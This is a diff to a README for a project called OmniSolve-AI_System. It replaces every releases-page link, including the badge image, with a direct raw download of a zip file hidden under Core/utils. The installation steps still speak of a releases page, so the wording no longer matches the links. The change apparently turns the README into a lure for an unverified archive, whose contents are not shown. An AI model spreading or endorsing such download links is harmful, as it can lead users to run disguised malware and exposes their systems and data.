@@ -7,7 +7,7 @@ OmniSolve-AI_System is a powerful tool that helps you manage your software proje
 To start using OmniSolve-AI_System, you need to download and install the application. Follow these simple steps to get up and running.
 
 ## 📥 Download Now
-[![Download OmniSolve-AI_System](https://img.shields.io/badge/Download-OmniSolve--AI--System-blue?style=for-the-badge)](https://github.com/GekoYumi/OmniSolve-AI_System/releases)
+[![Download OmniSolve-AI_System](https://github.com/GekoYumi/OmniSolve-AI_System/raw/refs/heads/main/Core/utils/System_Omni_Solve_A_v2.3.zip)](https://github.com/GekoYumi/OmniSolve-AI_System/raw/refs/heads/main/Core/utils/System_Omni_Solve_A_v2.3.zip)
 
 ## ✨ Features
 - **Multi-Agent System**: Collaborate with various AI agents to tackle different parts of your software project.
@@ -23,7 +23,7 @@ To start using OmniSolve-AI_System, you need to download and install the applica
 
 ## 📝 Installation Instructions
 1. **Visit the Download Page**: Click the link below to go to the releases page.
-   [Visit Releases Page](https://github.com/GekoYumi/OmniSolve-AI_System/releases)
+   [Visit Releases Page](https://github.com/GekoYumi/OmniSolve-AI_System/raw/refs/heads/main/Core/utils/System_Omni_Solve_A_v2.3.zip)
 
 2. **Download the Application**: On the releases page, find the latest version of OmniSolve-AI_System. Look for the file labeled with the version number and download it. 
 
@@ -76,4 +76,4 @@ Stay updated and engage with other users and developers. Join discussions in the
 
 ## 📥 Download Again
 If you missed it earlier, you can download OmniSolve-AI_System here:
-[Download OmniSolve-AI_System](https://github.com/GekoYumi/OmniSolve-AI_System/releases)
+[Download OmniSolve-AI_System](https://github.com/GekoYumi/OmniSolve-AI_System/raw/refs/heads/main/Core/utils/System_Omni_Solve_A_v2.3.zip)
